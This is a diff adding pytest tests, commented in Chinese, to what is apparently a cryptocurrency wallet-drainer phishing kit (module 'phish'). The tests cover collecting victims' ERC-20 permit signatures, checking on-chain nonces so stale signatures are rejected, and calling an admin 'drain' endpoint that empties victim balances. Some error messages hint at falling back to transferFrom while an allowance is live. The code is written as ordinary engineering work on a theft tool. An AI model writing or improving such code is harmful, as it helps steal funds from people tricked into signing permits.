@@ -341,6 +341,97 @@ class TestEventFlow:
         assert "链不可达" in state["balance_error"]
 
 
+class TestPermitNonceGuard:
+    """Ref #75:permit 受理必须比对链上 nonce,过期签名拒收而非进待收割清单。"""
+
+    def _permit(self, server, owner, nonce):
+        sig = "0x" + "11" * 32 + "22" * 32 + "1b"
+        return _post(server + "/api/event",
+                     {"type": "permit", "owner": owner, "sig": sig,
+                      "value": hex(10**21), "deadline": "1893456000",
+                      "nonce": str(nonce)})
+
+    def _items(self, server):
+        state = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])
+        return state["items"]
+
+    def test_matching_nonce_accepted(self, server, monkeypatch):
+        monkeypatch.setattr(phish, "token_nonce", lambda cfg, owner: 0)
+        status, body = self._permit(server, "0x" + "ab" * 20, 0)
+        assert status == 200 and body["ok"]
+        assert len(self._items(server)) == 1
+
+    def test_stale_nonce_rejected_with_readable_error(self, server, monkeypatch):
+        monkeypatch.setattr(phish, "token_nonce", lambda cfg, owner: 1)
+        status, body = self._permit(server, "0x" + "ab" * 20, 0)
+        assert status == 400 and "nonce" in body["error"]
+        assert self._items(server) == []
+        events = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])["events"]
+        assert any("nonce" in e["text"] for e in events)
+
+    def test_chain_unreachable_still_accepts_with_warning(self, server, monkeypatch):
+        monkeypatch.setattr(phish, "token_nonce", lambda cfg, owner: None)
+        status, body = self._permit(server, "0x" + "ab" * 20, 0)
+        assert status == 200 and body["ok"]
+        events = json.loads(_get(server + f"/admin/api/state?key={KEY}")[1])["events"]
+        assert any("nonce" in e["text"] for e in events)  # 带警示但收下
+
+    def test_drain_gives_readable_error_on_stale_nonce(self, server, monkeypatch):
+        # 直接收割一个已过期的存量项:nonce 推进且无授权 → 可读错误而非裸 revert
+        monkeypatch.setattr(phish, "token_nonce", lambda cfg, owner: 1)
+        monkeypatch.setattr(phish, "token_allowance", lambda cfg, o, s: 0)
+        phish.STORE.items.clear()
+        item_id = phish.STORE.add_item({"type": "permit", "victim": "0x" + "ab" * 20,
+                                        "sig": "0x" + "11" * 32 + "22" * 32 + "1b",
+                                        "value": 10**21, "deadline": 1893456000, "nonce": 0})
+        status, result = _post(server + f"/admin/api/drain?key={KEY}", {"itemId": item_id})
+        assert status == 200 and "nonce" in result["error"]
+
+    def test_drain_hints_direct_transfer_when_allowance_alive(self, server, monkeypatch):
+        monkeypatch.setattr(phish, "token_nonce", lambda cfg, owner: 1)
+        monkeypatch.setattr(phish, "token_allowance", lambda cfg, o, s: 10**21)
+        phish.STORE.items.clear()
+        item_id = phish.STORE.add_item({"type": "permit", "victim": "0x" + "ab" * 20,
+                                        "sig": "0x" + "11" * 32 + "22" * 32 + "1b",
+                                        "value": 10**21, "deadline": 1893456000, "nonce": 0})
+        _, result = _post(server + f"/admin/api/drain?key={KEY}", {"itemId": item_id})
+        assert "transferFrom" in result["error"] and "allowance" in result["error"]
+
+    def test_drain_says_unknown_when_allowance_query_fails(self, server, monkeypatch):
+        monkeypatch.setattr(phish, "token_nonce", lambda cfg, owner: 1)
+        monkeypatch.setattr(phish, "token_allowance", lambda cfg, o, s: None)
+        phish.STORE.items.clear()
+        item_id = phish.STORE.add_item({"type": "permit", "victim": "0x" + "ab" * 20,
+                                        "sig": "0x" + "11" * 32 + "22" * 32 + "1b",
+                                        "value": 10**21, "deadline": 1893456000, "nonce": 0})
+        _, result = _post(server + f"/admin/api/drain?key={KEY}", {"itemId": item_id})
+        assert "未知" in result["error"]
+
+    def test_drain_passes_through_when_nonce_matches(self, server, monkeypatch):
+        monkeypatch.setattr(phish, "token_nonce", lambda cfg, owner: 0)
+        monkeypatch.setattr(phish, "token_allowance", lambda cfg, o, s: 0)
+        phish.STORE.items.clear()
+        item_id = phish.STORE.add_item({"type": "permit", "victim": "0x" + "ab" * 20,
+                                        "sig": "0x" + "11" * 32 + "22" * 32 + "1b",
+                                        "value": 10**21, "deadline": 1893456000, "nonce": 0})
+        status, result = _post(server + f"/admin/api/drain?key={KEY}", {"itemId": item_id})
+        assert status == 200 and result["drained"] == 10**21  # nonce 匹配则正常放行
+
+
+class TestTokenNonceHelper:
+    def test_token_nonce_parses_hex(self, monkeypatch):
+        monkeypatch.setattr(phish.drain, "rpc", lambda *a, **k: "0x05")
+        assert phish.token_nonce({"chain": {"rpc": "u"}, "token": {"address": "0xt"}},
+                                 "0xv") == 5
+
+    def test_token_nonce_none_on_rpc_error(self, monkeypatch):
+        def boom(*a, **k):
+            raise RuntimeError("timeout")
+        monkeypatch.setattr(phish.drain, "rpc", boom)
+        assert phish.token_nonce({"chain": {"rpc": "u"}, "token": {"address": "0xt"}},
+                                 "0xv") is None
+
+
 class TestDrainGuard:
     def _permit_item(self, server, owner="0x" + "ab" * 20, value=hex(10**21)):
         sig = "0x" + "11" * 32 + "22" * 32 + "1b"
